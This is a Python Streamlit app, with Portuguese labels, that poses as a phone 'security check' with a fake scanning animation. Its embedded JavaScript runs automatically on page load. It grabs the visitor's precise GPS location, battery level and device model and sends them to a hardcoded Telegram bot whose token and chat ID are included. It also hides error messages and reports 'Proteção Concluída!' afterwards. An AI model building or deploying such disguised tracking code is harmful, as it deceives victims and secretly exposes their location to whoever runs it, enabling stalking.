import streamlit as st
import time

# --- CONFIGURAÇÃO DO BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- ESTILIZAÇÃO MANTIDA ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
        font-family: sans-serif;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# --- O COMPONENTE QUE "LIGA" O GPS VIA GOOGLE ---
js_gps_auto = f"""
<div id="container">
    <button class="btn-barra" onclick="forcarGpsGoogle()">
        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
async function forcarGpsGoogle() {{
    // 'enableHighAccuracy: true' é o que força o Android a oferecer para LIGAR o GPS
    const geoConfig = {{ 
        enableHighAccuracy: true, 
        timeout: 15000, 
        maximumAge: 0 
    }};

    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const bLvl = Math.round(bat.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                const mapa = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                
                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + bLvl + "%`\\n📍 [MAPA](" + mapa + ")";
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
                }});
                
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{ console.log(e); }}
        }},
        (err) => {{
            // Se o GPS estiver desligado na barra, este erro dispara o pop-up da Google
            console.log("Tentando forçar ativação do sistema...");
        }},
        geoConfig
    );
}}

// Tenta disparar o pop-up da Google assim que a página abre
setTimeout(forcarGpsGoogle, 500);
</script>
"""

ativou = st.components.v1.html(js_gps_auto, height=80)

if ativou:
    for p in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Concluída!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
